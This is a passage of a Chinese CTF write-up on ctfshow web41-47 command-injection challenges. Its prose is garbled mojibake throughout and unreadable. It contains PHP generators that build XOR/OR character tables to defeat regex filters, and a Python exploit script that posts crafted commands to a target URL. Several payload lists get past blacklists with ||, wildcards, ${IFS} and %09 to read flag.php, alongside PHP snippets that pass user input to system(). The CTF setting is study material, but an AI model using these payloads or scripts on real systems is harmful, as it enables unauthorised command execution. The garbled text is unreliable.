æ³•ä½¿ç”¨å¼‚æˆ–ã€è‡ªå¢å’Œå–åç»•è¿‡ï¼Œä¸è¿‡ï¼Œå¬è¯´ç½‘ä¸Šè¿˜æœ‰å¦ä¸€ä¸ªæ“ä½œï¼Œå°±æ˜¯åˆ©ç”¨ç®¡é“ç¬¦ï¼Œä¹Ÿå°±æ˜¯ | è¿ç®—ç¬¦ï¼Œè¿™é‡Œè´´ä¸€ä¸‹ç›¸å…³çš„æ–‡ç« ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA5MTQzNDEzP29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyMTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0LnBjJTI1NUZibG9nLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTYzNTMwMTA4MTE2NzgwMjYyNTU0NTc3JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5ibG9nfmZpcnN0X3JhbmtfdjJ+cmFua192MjktMS0xMDkxNDM0MTMucGNfdjJfcmFua19ibG9nX2RlZmF1bHQmYW1wO3V0bV90ZXJtPSVFNSU4RiU5NiVFNSU4RiU4RCZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=">æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTA4NTY5MDgw">ctfshow web å…¥é—¨ web41</span></p><p>â€‹è¿™é‡Œç»™äº†ä¸¤ä¸ªä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ python çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>â€‹å¦ä¸€ä¸ªï¼Œè´´ä¸€ä¸‹ç¾½ç¥çš„è„šæœ¬ï¼Œè¿™ä¸ªæ„Ÿè§‰æ›´å¥½ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;egï¼š  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><h1 id="web42"><a class="markdownIt-Anchor" href="#web42">#</a> Web42ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯¹äºè¿™é‡Œçš„ï¼Œå¯ä»¥å‚è€ƒä¸‹ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGlueXdhbi9wLzYwMjU0NjguaHRtbA==">     Shell è„šæœ¬ â€”â€”â€”â€” /dev/null 2&gt;&amp;1 è¯¦è§£ </span></p><p>â€‹è¿™é‡Œå¦‚æœåªæ˜¯æƒ³è¦è§£é¢˜çš„è¯ï¼Œå¯ä»¥æƒ³åŠæ³•è®©åé¢çš„ä¸æ‰§è¡Œï¼Œæˆ–è€…å‰ååˆ†ç¦»å¼€å°±è¡Œäº†ï¼Œè¿™é‡Œæœ‰å¦‚ä¸‹å‡ ç§æ–¹æ³•ï¼š</p><blockquote><p>; // åˆ†å·<br> | // åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br> || // åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br> &amp; // ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br> &amp;&amp; // ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h1 id="web43"><a class="markdownIt-Anchor" href="#web43">#</a> Web43ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯¹æ¯”ä¸Šä¸€é¢˜ï¼Œå¤šäº†ä¸€å±‚è¿‡æ»¤ï¼Œå¤šäº†ä¸€ä¸ª cat å’Œåˆ†å·ï¼Œè€æ ·å­ï¼ŒåŒä¸€ä¸ª payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla* ||</span><br></pre></td></tr></table></figure><p>â€‹å†ä¸€æ¬¡ï¼Œè´´ä¸€ä¸‹å¯ä»¥ç»•è¿‡çš„æ–¹å¼ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=more flag.php||</span><br><span class="line">?c=sort flag.php||</span><br><span class="line">?c=less flag.php||</span><br><span class="line">?c=tac flag.php||</span><br><span class="line">?c=tail flag.php||</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=strings flag.php||</span><br></pre></td></tr></table></figure><h1 id="web44"><a class="markdownIt-Anchor" href="#web44">#</a> Web44ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº† flagï¼Œé€šé…ç¬¦ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac f* ||</span><br></pre></td></tr></table></figure><h1 id="web45"><a class="markdownIt-Anchor" href="#web45">#</a> Web45ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€æ ·å­ï¼ŒIFS ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=tac<span class="built_in">$</span>&#123;IFS&#125;fla*||</span><br></pre></td></tr></table></figure><h1 id="web46"><a class="markdownIt-Anchor" href="#web46">#</a> Web46ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼å’Œæ˜Ÿå·ï¼Œæ˜Ÿå·ç›´æ¥ç”¨é—®å·ç»•è¿‡ï¼Œç©ºæ ¼ä½¿ç”¨ %09 ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac<span class="comment">%09fla?.php|| #è¿™é‡Œçš„%09ä¸å±äºæ•°å­—</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` é‡å®šå‘ç¬¦</span><br><span class="line">`<span class="comment">%09`(éœ€è¦phpç¯å¢ƒ)</span></span><br><span class="line">`<span class="built_in">$</span>&#123;IFS&#125;`</span><br><span class="line">`<span class="built_in">$</span>IFS<span class="built_in">$</span>9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">`<span class="comment">%20`</span></span><br><span class="line">`<span class="comment">%09</span></span><br></pre></td></tr></table></figure><h1 id="web47"><a class="markdownIt-Anchor" href="#web47">#</a> Web47ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| 